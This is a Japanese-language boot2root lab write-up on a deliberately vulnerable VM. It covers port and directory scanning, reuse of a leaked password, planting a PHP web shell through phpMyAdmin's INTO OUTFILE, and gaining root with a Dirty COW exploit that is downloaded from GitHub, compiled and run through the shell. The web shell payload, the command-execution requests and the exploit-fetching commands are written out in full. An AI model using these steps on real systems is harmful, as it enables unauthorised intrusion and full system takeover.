# Boot2root - Writeup 1 (初期調査〜Web侵入)

## 1. 探索と列挙 (Discovery & Enumeration)

### IPアドレスの特定
攻撃対象のネットワーク範囲をスキャンし、ターゲットのIPアドレスを特定した。

```bash
nmap -sn 100.64.0.0/22
# ターゲットIP: 100.64.1.32
```

### ポートスキャン
対象ホストに対して詳細なポートスキャンを実行した。

```bash
nmap -A -p- 100.64.1.32
```

**検出された主なオープンポート:**
*   21/tcp: FTP (vsftpd)
*   22/tcp: SSH (OpenSSH 5.9p1)
*   80/tcp: HTTP (Apache)
*   143/tcp: IMAP
*   443/tcp: HTTPS (Apache)
*   993/tcp: IMAPS

## 2. Webアプリケーション調査

### HTTP (Port 80) / HTTPS (Port 443)
ブラウザでアクセスすると "Hack me if you can" というタイトルの「Coming Soon」ページが表示されるのみであった。
そこで、ディレクトリ探索ツール (`gobuster`) と辞書ファイル (`scripts/common.txt`) を使用し、隠しディレクトリや管理ページを調査した。

※ `scripts/common.txt` は、ディレクトリ探索ツール `dirb` の標準辞書（`common.txt`）を使用。
(ソース: `https://github.com/v0re/dirb/blob/master/wordlists/common.txt`)

```bash
gobuster dir -u https://100.64.1.32/ -w scripts/common.txt -k
```

**スキャン結果:**
以下の重要なディレクトリが発見された。
*   `/forum` (HTTPでは 403 Forbidden, HTTPSでアクセス可能)
*   `/phpmyadmin` (データベース管理インターフェース)
*   `/webmail` (Webメールログイン画面)

### HTTPS (Port 443) の確認
発見されたディレクトリに HTTPS 経由でアクセスし、それぞれの稼働を確認した。
*   `https://100.64.1.32/forum/` (My Little Forum 掲示板)
*   `https://100.64.1.32/phpmyadmin/` (データベース管理)
*   `https://100.64.1.32/webmail/` (SquirrelMail Webメール)

## 3. 脆弱性の発見と情報漏洩

掲示板 (`/forum`) を調査中、以下のURLにて興味深い投稿を発見した。
URL: `https://100.64.1.32/forum/index.php?id=6`

**内容:**
ユーザー `lmezard` による投稿で、サーバーの `/var/log/auth.log` の一部が貼り付けられていた。
ログを解析したところ、ユーザーがパスワード入力欄ではなくユーザー名入力欄に誤ってパスワードを入力したと思われる記録を発見した。

```text
Oct  5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
```

**特定された認証情報:**
*   **パスワード:** `!q\]Ej?*5K5cy*AJ`
*   **関連ユーザー:** `lmezard` (投稿者)

## 4. Webサービスへの侵入

### 掲示板へのログイン
入手した情報を使用し、掲示板へのログインに成功した。
*   **ユーザー:** `lmezard`
*   **パスワード:** `!q\]Ej?*5K5cy*AJ`

ログイン後、`lmezard` のプロフィールページを確認し、以下のメールアドレスを入手した。
*   **Email:** `laurie@borntosec.net`

### WebメールへのログインとDB情報の奪取
掲示板で入手した認証情報が他のサービスでも使い回されている可能性を考慮し、Webメール (`SquirrelMail`) へのログインを試みた。

1.  **ログイン情報の入力:**
    *   **URL:** `https://100.64.1.32/webmail`
    *   **ユーザー:** `laurie@borntosec.net`
    *   **パスワード:** `!q\]Ej?*5K5cy*AJ`

2.  **情報の発見:**
    ログイン後、受信トレイを確認したところ、管理者から送信されたデータベースへのアクセス情報が記載されたメール（件名: "DB Access"）を発見した。

    **メール内容:**
    > Subject: DB Access
    > From: qudevide@mail.borntosec.net
    >
    > Hey Laurie,
    >
    > You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

これにより、データベースおよび phpMyAdmin へのフルアクセス権限を持つ特権アカウントを入手した。
*   **DB User:** `root`
*   **DB Password:** `Fg-'kKXBj87E:aJ$`

## 5. Web Shell の獲得 (Command Injection)

### phpMyAdmin を利用したファイル書き込み
入手済みのデータベース `root` ユーザーの認証情報 (`root`/`Fg-'kKXBj87E:aJ$`) を使用し、`phpMyAdmin` にログイン。`SELECT ... INTO OUTFILE` 機能を利用して、Web Shell ファイルを Web サーバーがアクセス可能なディレクトリに直接書き込んだ。

```sql
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/shell.php';
```

この操作により、`https://100.64.1.32/forum/templates_c/shell.php` に PHP Web Shell が正常に設置された。

### Web Shell の動作確認
Web Shell にアクセスし、コマンド実行が可能であることを確認した。

```bash
curl -k "https://100.64.1.32/forum/templates_c/shell.php?c=id"
```

**実行結果:**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
この結果により、`www-data` ユーザーの権限で任意のコマンド実行が可能となり、**Web Shell の獲得（コマンドインジェクション成功）** が確認された。

## 6. 権限昇格 (Privilege Escalation)

### カーネル情報の確認と脆弱性の特定
Web Shell 経由でシステム情報を確認したところ、古いカーネルバージョンが使用されていることが判明した。

```bash
uname -a
# Linux BornToSecHackMe 3.2.0-91-generic-pae ... i686 GNU/Linux

cat /etc/issue
# Ubuntu 12.04.5 LTS
```

このバージョン（Linux Kernel 3.2.0 / Ubuntu 12.04）は、権限昇格の脆弱性 **Dirty COW (CVE-2016-5195)** の影響を受けることが知られている。

### Dirty COW Exploit の実行
`/etc/passwd` ファイルを書き換えるタイプの Dirty COW exploit (通称 "Firefart") を使用することにした。

1.  **Exploitコードの転送:**
    ターゲットマシンはインターネット接続が可能であったため、Web Shell 経由で `curl` コマンドを実行し、GitHub から直接ソースコードを取得した。
    ```bash
    curl https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -o /tmp/dirty.c
    ```

    ```bash
    curl -k -G "https://100.64.1.32/forum/templates_c/shell.php"   --data-urlencode "c=curl https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -o /tmp/dirty.c"
    ```

2.  **コンパイル:**
    ターゲット上で `gcc` を使用してコンパイルを実行した。
    ```bash
    # Web Shell 経由で実行
    curl -k -G "https://100.64.1.32/forum/templates_c/shell.php" \
        --data-urlencode "c=gcc -pthread /tmp/dirty.c -o /tmp/dirty -lcrypt"
    ```

3.  **実行:**
    新しい root ユーザー (`toor`) のパスワードを設定して実行した。ここではパスワードを `gemini` とした。
    ```bash
    # Web Shell 経由で実行
    curl -k -G "https://100.64.1.32/forum/templates_c/shell.php" \
        --data-urlencode "c=/tmp/dirty gemini"
    ```

### Root 権限の獲得確認
Exploit 実行後、`/etc/passwd` を確認したところ、特権ユーザー `toor`（exploitの変種によっては `firefart`）が追加され、UID が `0` (root) に設定されていることが確認できた。

```text
toor:toHbXhZAaNbJc:0:0:pwned:/root:/bin/bash
```

このユーザーは root 権限を持っており、コンソールからログインすることでシステムを完全に掌握できる状態となった。
(SSH設定 `PermitRootLogin no` のため、リモートログインは制限されているが、ローカルコンソールまたは `su` コマンド経由でのアクセスが可能)

---
**結論:**
Web アプリケーションの脆弱性 (SQL Injection, Command Injection) を突き、最終的にカーネルの脆弱性 (Dirty COW) を利用して Root 権限を奪取することに成功した。
